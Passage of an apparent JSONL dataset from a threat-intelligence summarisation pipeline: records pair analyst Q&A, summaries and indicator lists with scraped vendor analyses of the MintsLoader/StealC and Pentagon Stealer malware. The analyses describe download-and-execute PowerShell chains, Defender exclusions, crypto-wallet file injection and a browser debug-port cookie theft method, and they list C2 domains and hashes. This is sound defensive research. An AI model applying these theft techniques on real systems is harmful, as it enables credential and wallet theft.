cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, StealC is an information stealer that targets sensitive data, including financial data, passwords, and tokens, stored by web browsers, extensions, applications, crypto-wallets, and email clients.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, the MintsLoader campaign is related to a wallet stealer, specifically the StealC information stealer, which targets sensitive data stored by web browsers, extensions, applications, crypto-wallets, and email clients.", "question": "Is it related to wallet stealer?"}, {"answer": "The StealC malware steals sensitive data, including financial data, passwords, and tokens, stored by web browsers, extensions, applications, crypto-wallets, and email clients.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is exfiltrated to the StealC command and control (C2) server using HTTP POST requests.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations include the United States and Europe, specifically the Electricity, Oil & Gas, and Law Firms & Legal Services industries. No specific bank names or wallets are mentioned in the context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery", "error": null, "summary": "Here is a concise 4-5 sentence summary of the article:\n\nThe MintsLoader malware campaign has been identified as a significant threat, utilizing a PowerShell-based loader to deliver second-stage payloads such as StealC and the Berkeley Open Infrastructure for Network Computing (BOINC) client. The malware employs anti-VM techniques and a Domain Generation Algorithm (DGA) to evade detection, targeting organizations in the United States and Europe, particularly in the Electricity, Oil & Gas, and Law Firms & Legal Services industries. The infection process begins with a spam email containing a link to a JScript file, which downloads and executes the MintsLoader payload. The potential impact of this campaign is significant, as StealC is an information stealer that can harvest sensitive data, including financial information, passwords, and tokens. To mitigate this threat, recommendations include disabling certain executables, employing email filtering and protection measures, and using Next-Gen AV or Endpoint Detection and Response solutions.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "c2server.evil"}, {"type": "Domain or URL", "value": "temp[.]sh"}, {"type": "Domain or URL", "value": "Pomf[.]se"}, {"type": "Domain or URL", "value": "exploit[.]in"}, {"type": "SHA256 Hash", "value": "138d2a62b73e89fc4d09416bcefed27e139ae90016ba4493efc5fbf43b66acfa"}], "mitre_ttps": null, "keywords_found": ["botnet", "threat", "intelligence", "analysis", "wallet", "browser", "malicious", "phishing", "passwords", "apt"], "article_textual_content": "# ESENTIRE SERVICES\n\n##### Managed Detection and Response\n\nCombine cutting-edge XDR technology, multi-signal threat intelligence and 24/7 Elite Threat Hunters to help you build a world-class security operation.\n\n##### All-In-One MDR Solution →\n\n##### MDR for Microsoft →\n\n##### MDR for GenAI →\n\n##### Digital Forensics and Incident Response\n\nGet unlimited Incident Response with threat suppression guarantee - anytime, anywhere.\n\n##### Continuous Threat Exposure Management (CTEM)\n\nCTEM and advisory programs that identify security gaps and build proactive strategies to address them.\n\n###### PLATFORM, PEOPLE AND RESPONSE\n\n##### Security Operations Center (SOC)\n\n24/7 SOC-as-a-Service with unlimited threat hunting and incident handling.\n\n##### Extended Detection and\n Response (XDR)\n\nXDR with machine learning that eliminates noise, enables real-time detection and response, and automatically blocks threats.\n\n##### Technology Integrations\n\nSeamless integration and threat investigation across your existing tech stack.\n\n##### Threat Response Unit (TRU)\n\nProactive threat intelligence, original threat research and a world-class team of seasoned industry veterans.\n\n##### Cyber Resilience Team\n\nExtend your team capabilities and prevent business disruption with expertise from eSentire.\n\n##### Response and Remediation\n\nWe balance automated blocks with rapid human-led investigations to manage threats.\n\nHow We Do\n\n###### MDR Packages and 24/7 Protection\n\n##### MDR Pricing and Packages\n\nFlexible MDR pricing and packages that fit your unique security requirements.\n\n###### Atlas Essentials\n\nEntry level foundational MDR coverage\n\n###### Atlas Advanced\n\nComprehensive Next Level MDR from eSentire\n\n###### Atlas Complete\n\nNext Level MDR with Cyber Risk Advisors to continuously advance your security program\n\n###### 24/7 Coverage\n\n##### Endpoint\n\n##### Network\n\n##### Log\n\n##### Cloud\n\n##### Identity\n\n###### INDUSTRIES\n\n##### Insurance\n\n##### Construction\n\n##### Finance\n\n##### Legal\n\n##### Manufacturing\n\n##### Private Equity\n\n##### Healthcare\n\n##### Retail\n\n##### Food Supply\n\n##### Government and Education\n\n##### Automotive Dealerships\n\n###### USE CASES\n\n##### Ransomware\n\nStop ransomware before it spreads.\n\n##### Cybersecurity Compliance\n\nMeet regulatory compliance mandates.\n\n##### Zero Day Attacks\n\nDetect and respond to zero-day exploits.\n\n##### Cloud Misconfiguration\n\nEnd misconfigurations and policy violations.\n\n##### Third-Party Risk\n\nDefend third-party and supply chain risk.\n\n##### Do More With Less\n\nPrevent disruption by outsourcing MDR.\n\n##### Cyber Risk\n\nAdopt a risk-based security approach.\n\n##### Cyber Insurance\n\nMeet insurability requirements with MDR.\n\n##### Sensitive Data Security\n\nProtect your most sensitive data.\n\n##### Security Leadership\n\nBuild a proven security program.\n\n##### Cyber Threat Intelligence\n\nOperationalize timely, accurate, and actionable cyber threat intelligence.\n\nResources\n\n###### From The Blog\n\n##### Pure Crypter Malware Analysis: 99 Problems but Detection Ain’t One\n\n##### MDR Vendors: Complete Guide to Understanding Managed Detection &amp; Response…\n\n##### Identity is the New Attack Surface: Why Threat Detection Alone Isn't…\n\n###### Resources\n\n##### Case Studies\n\n##### Compare MDR Vendors\n\n##### TRU Intelligence Center\n\n##### Cybersecurity Tools\n\n##### Videos\n\n##### Reports\n\n##### Webinars\n\n##### Data Sheets\n\n##### Real vs. Fake MDR\n\n##### Blogs\n\n##### Security Advisories\n\n###### SECURITY ADVISORIES\n\n##### Exploit Released for Ivanti Zero-Day Vulnerabilities (CVE-2025-4427 and CVE-2025-4428)\n\nTHE THREAT\r\n\r\n\r\n    On May 13th, Ivanti disclosed two zero-day vulnerabilities, CVE-2025-4427 and CVE-2025-4428, impacting Ivanti Endpoint Manager Mobile (EPMM). Ivanti confirmed that…\n\n##### Maximum Severity SAP Vulnerability Exploited\n\nTHE THREAT\r\n\r\n    On April 24th, SAP disclosed a maximum severity vulnerability impacting SAP NetWeaver systems. The vulnerability was initially reported to SAP by researchers from…\n\nCompany\n\n###### ABOUT ESENTIRE\n\neSentire is The Authority in Managed Detection and Response Services, protecting the critical data and applications of 2000+ organizations in 80+ countries from known and unknown cyber threats. Founded in 2001, the company’s mission is to hunt, investigate and stop cyber threats before they become business disrupting events.\n\n##### About Us →\n\n##### Leadership →\n\n##### Careers →\n\n##### Event Calendar →\n\n##### Newsroom →\n\n##### Aston Villa Football Club →\n\n###### EVENT CALENDAR\n\nMay\n\n15\n\n##### Cybersecurity Summit Toronto\n\nMay\n\n21\n\n##### Cybersec Brussels\n\nMay\n\n22\n\n##### Cybersecurity Summit Austin\n\nJun\n\n05\n\n##### Elevate IT Technology Summit Dallas\n\nJun\n\n05\n\n##### Cybersecurity Summit Salt Lake City\n\n###### LATEST PRESS RELEASE\n\n##### eSentire Unleashes AI-Driven Atlas Nexus Network, Empowering Cybersecurity Partners to Build Differentiated Security Services at Scale\n\n###### OUR PARTNERSHIPS\n\n##### Aston Villa Football Club\n\nAVFC takes its cyber protection to the Next Level with eSentire as its official cybersecurity partner.\n\nPartners\n\n###### PARTNER PROGRAM\n\nWe provide sophisticated cybersecurity solutions for Managed Security Service Providers (MSSPs), Managed Service Providers (MSPs), and Value-Added Resellers (VARs). Find out why you should partner with eSentire, the Authority in Managed Detection and Response, today.\n\nApply to become an e3 ecosystem partner with eSentire today.\n\nLogin to the Partner Portal for resources and content for current partners.\n\nSearch\n\n### Search our site\n\n#### Quick Links\n\n##### ALL-IN-ONE MDR SERVICE →\n\nMulti-Signal MDR with 300+ technology integrations to support your existing investments.\n\n##### 24/7 SOC SUPPORT →\n\n24/7 SOC-as-a-Service with unlimited threat hunting and incident handling.\n\n##### MDR PRICING AND PACKAGES →\n\nWe offer three flexible MDR pricing packages that can be customized to your unique needs.\n\n##### TRU INTELLIGENCE CENTER →\n\nThe latest security advisories, blogs, reports, industry publications and webinars published by TRU.\n\n##### MDR VENDOR COMPARISONS →\n\nCompare eSentire to other Managed Detection and Response vendors to see how we stack up against the competition.\n\n##### MDR CASE STUDIES →\n\nSee why 2000+ organizations globally have chosen eSentire for their MDR Solution.\n\nGet Started\n\n##### Get Started →\n\n##### Build A Quote →\n\n##### Become A Partner →\n\n##### Blog\n\n# MintsLoader: StealC and BOINC Delivery\n\nBY eSentire Threat Response Unit (TRU)\n\nJanuary 16, 2025 | 9 MINS READ\n\nThreat Intelligence\n\nThreat Response Unit\n\nTRU Positive/Bulletin\n\n### Want to learn more on how to achieve Cyber Resilience?\n\nAdversaries don’t work 9-5 and neither do we. At eSentire, our 24/7 SOCs are staffed with Elite Threat Hunters and Cyber Analysts who hunt, investigate, contain and respond to threats within minutes.\n\nWe have discovered some of the most dangerous threats and nation state attacks in our space – including the Kaseya MSP breach and the more\\_eggs malware.\n\nOur Security Operations Centers are supported with Threat Intelligence, Tactical Threat Response and Advanced Threat Analytics driven by our Threat Response Unit – the TRU team.\n\nIn TRU Positives, eSentire’s Threat Response Unit (TRU) provides a summary of a recent threat investigation. We outline how we responded to the confirmed threat and what recommendations we have going forward.\n\nHere’s the latest from our TRU Team…\n\n## What did we find?\n\nIn early January 2025, the eSentire Threat Response Unit (TRU) identified an ongoing campaign involving MintsLoader delivering second stage payloads like Stealc and the Berkeley Open Infrastructure for Network Computing (BOINC) client. MintsLoader is a PowerShell based malware loader that has been seen delivered via spam emails with a link to Kongtuke/ClickFix pages or a JScript file. MintsLoader features a Domain Generation Algorithm (DGA) with a seed value based on the addition of the current day of the month and a constant, combined with anti-VM techniques to evade sandboxes and malware researchers. Impacted organizations in the United States and Europe include the Electricity, Oil &amp; Gas and Law Firms &amp; Legal Services industries. ￼\n\nThe MintsLoader infection process begins when the victim clicks a link in a spam email which downloads a JScript file matching the regex pattern, “Fattura[0-9]{8}.js”.\n\nFigure 1 – JScript download\n\nThe contents of the script can be seen in the following figure.\n\nFigure 2 – JScript obfuscated contents\n\nThe contents of the deobfuscated JScript can be seen below. First a sleep occurs for 13 seconds, then a WScript.Shell object is instantiated, and the Run method is called to execute the first MintsLoader associated command in PowerShell. This command uses the curl command to retrieve the first stage of MintsLoader. Before the script exits, it deletes itself, likely as a measure to make it more difficult for responders to acquire the file for analysis. It is worth noting that the format of the PowerShell command is identical in cases where MintsLoader is instead delivered via ClickFix/KongTuke, however it is executed in a Run prompt instead of via WScript.\n\nFigure 3 - Deobfuscated JScript contents\n\nThe response from the MintsLoader C2 is obfuscated and is more PowerShell that uses Invoke-Expression (iex) again to execute the next stage.\n\nFigure 4 – Obfuscated first stage\n\nThe next stage of PowerShell is obfuscated as well and begins with decoding each line as an array of integers to their equivalent ASCII values.\n\nFigure 5 – Obfuscated next stage\n\nThe beginning of the deobfuscated script checks if the victim machine is a virtual machine via the WMI object Get-MpComputerStatus cmdlet property IsVirtualMachine. Also shown in the figure below, the variable “$key” stores a value that is used throughout the script and later is sent to the C2.\n\nFigure 6 – Check if virtual machine via Get-MpComputerStatus\n\nNext the cmdlet Win32\\_VideoController is queried and the object AdapterDACType is matched against the following strings. The first statement in the switch statement aims to identify a system that is likely not a virtual machine by checking for the presence of the strings “Internal” or “Integrated”. The remaining strings that are checked are as follows and serve to identify the machine as a VM and specifically target VMWare and KVM/QEMU/Bochs based hypervisors.\n\n- VMware\n- Bochs\n- Intel\n- SeaBIOS\n\nFigure 7 – Check if virtual machine via Win32\\_VideoController object AdapterDACType\n\nNext, two constants are added to the $key variable and the WMI cmdlet Win32\\_CacheMemory is queried, acquiring the first object’s purpose property and comparing it in a switch statement. The first two conditions in the switch statement check if the property equals L1 or is less than 4 characters, which aims to identify virtual machines. The final check aims to identify if a system is likely a physical machine.\n\nFigure 8 – Check if virtual machine via Win32\\_CacheMemory\n\nMintsLoader then makes use of a DGA that uses a seed value consisting of the current day of the month plus a constant in a loop. The loop is iterated 15 times over and the System.Random object and Next method are utilized as indexes into the character array “abcdefghijklmn”. Finally, the resulting C2 domain is appended with the TLD of the C2 server (.top).\n\nFigure 9 – DGA generate C2 server for the day\n\nA string containing part of the URI path is then built from a random ascii-numeric character array with a length of 10 characters using the Get-Random cmdlet. This is used as part of the full C2 URI path. The query parameters are built first by getting the computer name via the environment variable ComputerName which is used as the value for the id query parameter, the aforementioned $key variable is used as the value for the key query parameter, and the s query parameter contains a hard-coded number, e.g. 527. The curl command is used again to invoke the request to the C2 and the response from the C2 is invoked again via iex.\n\nFigure 10 – Send request to C2 and invoke response\n\nThe following is a list of all the possible DGA generated domains identified in this campaign.\n\nFigure 11 – Known DGA domains\n\nThe final PowerShell stage is also obfuscated and decodes more integers to ASCII. When deobfuscated, a poorly written and known Anti-Malware Scan Interface (AMSI) bypass technique fails to run due to improper de-obfuscation. A web request is then invoked to download the payload from temp[.]sh, a file hosting site that is a clone of Pomf[.]se. The response is written to the temp directory and is executed. Though the file hosting site is no longer serving the file, the SHA-256 of the file is available for download in VirusTotal. This file is a packed sample of the information stealing malware StealC.\n\nFigure 12 – Final stage, download/execute StealC\n\nStealC is an information stealer advertised by its developer “Plymouth” on Russian-speaking underground forums and has been sold as a Malware-as-a-Service since January 2023. Re-engineered from the information stealer Arkei first seen in 2018, StealC targets sensitive data stored by web browsers, extensions, applications, crypto-wallets, and email clients, including financial data, passwords, and tokens. Several legitimate DLLs, e.g. sqlite3.dll, nss3.dll, mozglue.dll, softokn3.dll, and others are downloaded and utilized as part of this process. Harvested data is exfiltrated to its command and control (C2) server using HTTP POST requests.\n\nThe admin panel for StealC can be seen in the figure below, which provides threat actors with a variety of features, such as a query builder for sorting through stolen logs.\n\nFigure 13 – StealC operator panel from sales thread on exploit[.]in (Feb 2023)\n\nStealC makes use of XOR encrypted strings to hide from static analysis. The routine that handles decryption of the strings is one of the first behaviors by StealC, the resulting decrypted strings are stored as DWORD pointers.\n\nFigure 14 – StealC string decryption\n\nFor this particular sample (138d2a62b73e89fc4d09416bcefed27e139ae90016ba4493efc5fbf43b66acfa) we identified the following C2 URL and Botnet ID in the strings:\n\nFigure 15 – StealC C2 and Botnet ID\n\nAfter string decryption and resolving APIs there are several anti-debug/anti-analysis subroutines. For example, the C code included below checks if the username of the current user is “JohnDoe”. If so, the malware exits.\n\nFigure 16 – StealC username check for JohnDoe\n\nStealC contains a check to ensure the malware doesn’t run on any systems that have the default language ID associated with Russia, Ukraine, Belarus, Kazakhstan, or Uzbekistan. If any of these languages match, the malware exits.\n\nFigure 17 – StealC check for banned countries\n\nThe count of processor cores is checked, if the system only has a single core, the malware exits.\n\nFigure 18 – StealC processors check\n\nThe total memory of the system is retrieved, if less than 1111 MB, the malware exits.\n\nFigure 19 – StealC memory check\n\nThe vertical height of the system's resolution is checked, if less than 666, the malware exits.\n\nFigure 20 – StealC resolution check\n\nPrior to communicating with C2, a hardware ID (HWID) is generated. This HWID is generated based on the C:\\ drive volume serial number and is unlikely to change so it is likely checked by threat actors to filter stolen logs in the backend or as a measure to deny access to known sandboxes. The python script here can be used to generate the HWID and decode an existing HWID if one is identified in incidents where HTTP traffic has been captured.\n\nFigure 21 – StealC HWID generation via Volume Serial\n\nThe following figure displays the initial HTTP POST request to the script gate where “&lt;HWID&gt;” represents the generated HWID. Though the C2 is no longer online, the response would contain a base64 encoded configuration. Subsequent HTTP POST requests follow a similar format and are used for exfiltration of harvested files, credentials, and other sensitive information. HTTP GET requests are used for retrieving needed third party libraries, such as sqlite3.dll.\n\nFigure 22 – StealC Initial C2 request\n\n## What did we do?\n\n- Our team of 24/7 SOC Cyber Analysts proactively isolated the affected host to contain the infection on the customer’s behalf.\n- We communicated what happened with the customer and helped them with remediation efforts.\n\n## What can you learn from this TRU Positive?\n\n- The MintsLoader campaign is an evasive threat found targeting organizations in the United States/Europe, is primarily distributed via spam emails containing a link to a JScript file or via ClickFix/KongTuke, and when paired with information stealers like StealC, becomes an even more capable threat to the confidentiality and integrity of sensitive data.\n\n## Recommendations from the Threat Response Unit (TRU):\n\n- Disable the Run prompt via GPO:\n    - User Configuration &gt; Administrative Templates &gt; Start Menu and Taskbar &gt; Enable “Remove Run menu from Start Menu”\n- Disable wscript.exe via AppLocker GPO or Windows Defender Application Control (WDAC):\n    - C:\\Windows\\System32\\WScript.exe\n    - C:\\Windows\\Syswow64\\WScript.exe\n    - *:\\Windows\\System32\\WScript.exe (* represents wildcard to include other drive letter rather than C drive)\n    - *:\\Windows\\SysWOW64\\WScript.exe (* represents wildcard to include other drive letter rather than C drive)\n- Disable mshta.exe via AppLocker GPO or Windows Defender Application Control (WDAC)\n    - C:\\Windows\\System32\\mshta.exe\n    - C:\\Windows\\Syswow64\\mshta.exe\n    - *:\\Windows\\System32\\mshta.exe (* represents wildcard to include other drive letter rather than C drive)\n    - *:\\Windows\\SysWOW64\\mshta.exe (* represents wildcard to include other drive letter rather than C drive)\n- Employ email filtering and protection measures.\n- Use a Next-Gen AV (NGAV) or Endpoint Detection and Response (EDR) solution to detect and contain threats.\n- Implement a Phishing and Security Awareness Training (PSAT) program that educates and informs your employees.\n\n## Indicators of Compromise\n\nYou can access the Indicators of Compromise here.\n\n## References\n\nhttps://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\n\nhttps://www.forcepoint.com/blog/x-labs/malicious-javascript-code-sent-via-pec-email-italy\n\nhttps://levelblue.com/blogs/labs-research/asyncrat-loader-obfuscation-dgas-decoys-and-govno\n\nhttps://x.com/CERTCyberdef/status/1849392561024065779\n\n###### eSentire Threat Response Unit (TRU)\n\nThe eSentire Threat Response Unit (TRU) is an industry-leading threat research team committed to helping your organization become more resilient. TRU is an elite team of threat hunters and researchers that supports our 24/7 Security Operations Centers (SOCs), builds threat detection models across the eSentire XDR Cloud Platform, and works as an extension of your security team to continuously improve our Managed Detection and Response service. By providing complete visibility across your attack surface and performing global threat sweeps and proactive hypothesis-driven threat hunts augmented by original threat research, we are laser-focused on defending your organization against known and unknown threats.\n\n## Read the Latest from eSentire\n\nCookies allow us to deliver the best possible experience for you on our website - by continuing to use our website or by closing this box, you are consenting to our use of cookies. Visit our Privacy Policy to learn more.\n\nARE YOU EXPERIENCING A SECURITY INCIDENT OR HAVE YOU BEEN BREACHED?\n\n### The Proven Choice for \nManaged Detection and Response\n\n### Sales and \nCustomer Support\n\n##### What we do\n\n##### How we do it\n\n##### Industries\n\n##### Use Cases\n\n##### Resources\n\n##### Tools\n\n##### Company\n\n2025 eSentire, Inc. All Rights Reserved."}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://medium.com/@anyrun/pentagon-stealer-go-and-python-malware-with-crypto-theft-capabilities-9f9852c4be60", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "Pentagon Stealer is a type of malware with crypto theft capabilities, specifically designed to steal browser credentials, cookies, cryptowallet data, and other sensitive information.", "question": "What kind of malware is it?"}, {"answer": "The Pentagon Stealer malware involves a crypto theft attack, specifically targeting cryptocurrency wallets, browser credentials, cookies, and other sensitive data.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware, specifically the Pentagon Stealer, uses web inject to steal data from cryptocurrency wallet management applications, such as Atomic and Exodus, by replacing their app.asar files with patched versions.", "question": "Does the malware using web inject?"}, {"answer": "Yes, Pentagon Stealer steals browser credentials, including login credentials and cookies from Chromium-based browsers and Mozilla Firefox.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, Pentagon Stealer is related to wallet stealing, as it targets cryptocurrency wallets, including Atomic and Exodus, to steal user data such as mnemonics and passwords.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as Pentagon Stealer, steals various types of information, including browser credentials, cookies, cryptowallet data, Discord and Telegram tokens, and specific files. It also steals data from cryptocurrency wallet management applications, such as Atomic and Exodus, including mnemonics and passwords. Additionally, it can steal passwords from Gecko-based browsers, including Firefox.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is forwarded to the command and control (C2) servers, specifically to domains such as pentagon[.]cy and stealer[.]cy, via HTTP requests.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations and entities include: \n- Chromium-based browsers \n- Mozilla Firefox \n- Discord \n- Telegram \n- Atomic and Exodus cryptocurrency wallets \n- Steam and Epic Games accounts \n- NordVPN configuration files. \nNo specific regions or bank names are mentioned in the context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://medium.com/@anyrun/pentagon-stealer-go-and-python-malware-with-crypto-theft-capabilities-9f9852c4be60", "error": null, "summary": "The Pentagon Stealer is a malware that exists in both Python and Golang versions, with capabilities to steal browser credentials, cookies, cryptowallet data, and specific files. The malware uses techniques such as launching Chromium-based browsers in debug mode to extract unencrypted cookies and replacing app.asar files in Atomic and Exodus wallets to steal mnemonics and passwords. The targets of this malware include individuals with cryptocurrency wallets and those using popular web browsers, with potential impacts including financial loss and sensitive data theft. The malware communicates with its command and control (C2) server via HTTP requests, using domains such as pentagon[.]cy and stealer[.]cy, and has undergone various modifications and campaigns, including typosquatting and the emergence of new variants like BLX Stealer.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "pentagon[.]cy"}, {"type": "Domain or URL", "value": "stealer[.]cy"}, {"type": "Domain or URL", "value": "gofile.io"}, {"type": "Domain or URL", "value": "funcaptcha[.]ru"}, {"type": "Domain or URL", "value": "1312services[.]ru"}, {"type": "Domain or URL", "value": "1312stealing[.]ru"}, {"type": "Domain or URL", "value": "biteblob[.]com"}, {"type": "SHA256 Hash", "value": "0411589551ab684892e3cc776674df0f07bcdbb931c29da93c2afd08fe077336"}], "mitre_ttps": null, "keywords_found": ["intelligence", "cryptocurrency", "threat", "wallet", "apt", "passwords", "analysis", "browser", "dropper", "malicious"], "article_textual_content": "Pentagon Stealer: Go and Python Malware with Crypto Theft Capabilities | by ANY.RUN | Apr, 2025 | MediumSitemapOpen in appSign upSign inMedium LogoWriteSign upSign inPentagon Stealer: Go and Python Malware with Crypto Theft CapabilitiesANY.RUNFollow11 min read·Apr 29, 2025--ListenShareThe current article provides technical analysis of an emerging malware named Pentagon Stealer. The research has been prepared by the analyst team atANY.RUN.Key TakeawaysVariants: Exists inPython(AES-encrypted, multi-stage) and Golang (unencrypted, part of attack chains) versions.Data Theft: Steals browser credentials, cookies,cryptowallet data (Atomic/Exodus), Discord/Telegram tokens, and specific files.Debug Mode Exploitation: Launches Chromium-based browsers in debug mode to extract unencrypted cookies, bypassing DPAPIencryptionfor easier data theft.Crypto Wallet Injection: Replaces app.asar files in Atomic/Exodus wallets with patched versions to steal mnemonics/passwords, using a public proof-of-concept available on GitHub.Evolution and Campaigns: Spread via typosquatting, later under the names 1312, Acab, Vilsa, and BLX stealer. BLX adds clipboard, screenshot, and Steam/Epic data theft.C2 Communication: Uses HTTP requests with servers like pentagon[.]cy andstealer[.]cy; BLX uploads to gofile.io, sending links to C2.Ongoing Threat: Simple but persistent, with new variants showing minor updates, continuing to pose risks.How We Discovered Pentagon StealerIn early March of this year, when browsingPublic submissions, the ANY.RUN team came across an interesting malware sample written in Golang.View sandbox analysis of the sampleThe malicious program exhibited unusual behavior, first terminating and then restarting processes of popular web browsers (Image 1).Image 1. ANY.RUN Sandbox showing the sample’s browser activitiesThe malware also engaged in data theft, which was flagged by ANY.RUN’s Interactive Sandbox.Image 2. The sandbox flagged Pentagon’s data theft attemptsTo collect more context about this malware, we usedThreat Intelligence Lookup(Image 3) with queries like the following one:domainName:”pentagon.cy” OR domainName:”stealer.cy”Image 3. Sandbox analyses with the Pentagon tag displayed in TI LookupAmong the search results, we identifieda sandbox analysisof a website hosted on the domainpentagon.cythat featured the admin panel of this malware. Thus, we named it Pentagon Stealer.Image 4. The admin panelExploring the website further, we discovered that there was also a Python-based version of this malicious program, available atpentagon[.]cy/paste?userid=<n>. You can see the page inthis sandbox session.Image 5. The original pagecontaining a dropper script for deploying the first stage of the malwareConsidering the lack of public information on the malware and its potential to pose serious threat to our clients, we decided to analyze it and collect essential intel for effective detection of Pentagon Stealer.Here’s what we’ve found.Follow along the analysis with ANY.RUN’s Interactive Sandbox and launch your own malware investigations.Sign up with business email.Python Version of Pentagon StealerLet’s start with the Python variant which still can be found on the attackers’ infrastructure to this day. Next, we’ll compare its functionality to that of the previous versions.Initial Stage: Script DropperAs seen in thesandbox analysis, the attack begins with a script dropper. Its purpose is to launch python_setup.py encrypted via Fernet using AES in CBC mode.Image 6.Decrypted script in CyberChefUse thisdecryption recipe in CyberCheffor decrypting the initial and all the following stages, as the algorithm remains unchanged, only the key changes.Main Stealer ModuleOnce we decrypt the payload, we can see the code of the stealer’s main module.First, it checks whether the directory “%LOCALAPPDATA%/HD Realtek Audio Player” exists on the victim’s computer. If not, it creates it and continues execution. This is a technique used by the malware to check if the machine has already been infected.The malware then begins to steal a variety of data, including:Login credentials, cookies, and extension data from Chromium-based browsers and cookie data from Mozilla FirefoxImage 7. Code for stealing Firefox cookiesData from apps for managing cryptocurrency walletsDiscord tokens and Telegram authorization dataFiles with specific names and extensions from user directoriesThere are also two actions performed by the malware that stand out from the rest and are worth a more detailed analysis:To steal cookies, Pentagon launches Chromium-based browsers in debug mode.The malware also replacesapp.asarfiles used by Exodus and Atomic wallets.Let’s take a closer look at them.Injection into Atomic and Exodus Crypto WalletsThe stealer can inject into two popular cryptocurrency wallet management applications: Atomic and Exodus. Both useElectron, which stores JavaScript code in app.asar files.The injection performed by Pentagon involves replacing these files with attacker-patched versions.The image above shows the stealer overwriting theapp.asarcontent of both applications with data from its command server. Additionally, a loguuid is written to the LICENSE files in both cases, which allows the attackers to identify the victim.Image 8. Code for injecting into Atomic and ExodusBut why did they overwrite app.asar and what specific changes were made?Since .asar files are archives containing .js files, we can unpack them with 7-Zip with aspecial pluginto analyze the code. As expected, the goal here is to obtain the user’s mnemonic and password. The images below illustrate how this is done.Image 9. Collection of the user data in Atomic WalletThe images show how a packet, containing the user’s password, mnemonic, and wallet type, is formed. One of the headers includes the loguuid.Image 10. Collection of the user data in Exodus WalletIt’s worth noting that the attacker clearly usedInject_PoCin this part of the operation, as indicated by the code similarity.For example, the Atomic Wallet section from the PoC repository looks like this:Image 11. The attacker reused code for injecting into AtomicThe similarity is evident. The attacker just simplified the packet. In the case of Atomic, even the application version matches.For Exodus, the code segment from the repository looks like this:Image 12. Inject_PoC code for injecting into ExodusLaunching Browsers in Debug ModeThis is acommon techniquefor obtaining cookies in unencrypted form.In short, this method causes some Chromium-based browsers to provide cookies in plaintext. If the standard method of extracting cookies from files were used, they would need to be decrypted, which can be problematic.These browsers use the DPAPI mechanism to protect sensitive data. If the malware is executed in the session of a user whose password was used in the encryption process, a call to the UnProtect() function may be enough to decrypt the data. Otherwise, decryption can be extremely difficult. In addition, the task may be complicated, for example, by theApplication-Bound (App-Bound) Encryption methodused in the latest versions of Chrome.Here’s how debugging helps to get cookies in an easier way:The browser is launched with a specified debugging port (default 9222).A GET request is made to http://localhost:9222/json, which returns a JSON response containing webSocketDebuggerUrl.Commands can be sent to this URL using the WebSocket protocol.Using the Network.getAllCookies command, the desired cookies are obtained, already decrypted by the browser.Image 13.Code for launching browsers in debug modeThis method explains the unusual behavior of relaunching browser, which piqued our interest when we first came across Pentagon’s sample.Decryption and Transition to the Next Stage: runpython.pyThe final part of the stealer module is the decryption and launch of the next stage, runpython.py.Image 14. Code for initializing the next stageOnce we decrypt the payload, we can see the command used.Image 15. Decrypted command for the next stage launchFollowing the URL inside the command reveals the dropper script used for launching runpython.py.Image 16. Runpython.py dropper scriptYet Another Stage: Functionality of runpython.pyInside runpython.py, we can see the following bat-file:Image 17. Bat-file loader of the next stageIt follows this algorithm:Checks if it has access to system files, indicating admin rights.If not, creates a temporary VBS script to relaunch the current BAT script with admin rights.Creates the directory C:\\Windows\\WinEmptyfold as an infection indicator.Runs PowerShell to add a Windows Defender exclusion, preventing it from scanning the C:/ drive.Downloads the next stage from a remote resource and executes it as RuntimeBroker.exe.Deletes files and directories used by the stealer.In all samples we have analyzed (example), Pentagon Stealer exclusively dropped Purecrypter which then deployed a miner. However, it is possible that there can be alternative payloads.Attack Chain and Timeline of Python-based Pentagon StealerPentagon Stealer’s chain of attack can be represented in the following way:Image 18. Python-based Pentagon Stealer kill chainLet’s now take a look at Pentagon’s development timeline and see what methods the attackers used for delivering it to victims.March 2024: Typosquatting CampaignOne of theearliest campaignswe came across in our research involved masking Pentagon as popular PyPI Python packages using a technique called “typosquatting”.In this version, the malware couldn’t steal Web Data from Chromium browsers, unencrypted cookies via browser debugging, or Telegram data. Additionally, the protocol for interacting with the C2 server was more primitive: all information was written to files, which were then sent to funcaptcha[.]ru/delivery.September 2024: 1312 StealerIn another campaign, the stealer was available under the name 1312 Stealer. ANY.RUN’sPublic submissionshelp us track changes in the admin panel.On September 22024, it appeared as follows:Image 19. 1312 Stealer Admin Panel on 02.09.24BySeptember 23, it looked like this:Image 20. 1312 Stealer Admin panel on 23.09.24A Telegram account is listed for contact, previously seen in Pentagon Stealer Admin Panel.This campaign used two domains: 1312services[.]ru and 1312stealing[.]ru.The code for this version canbe viewed here.1312’s new functionality included stealing Web Data from Chromium-based browsers and Telegram tdata. Communication with the C2 server changed: passwords were sent to 1312services[.]ru/pw, Web Data to 1312services[.]ru/webdata, and everything else to 1312services[.]ru/delivery.Other CampaignsThere are also versions of 1312 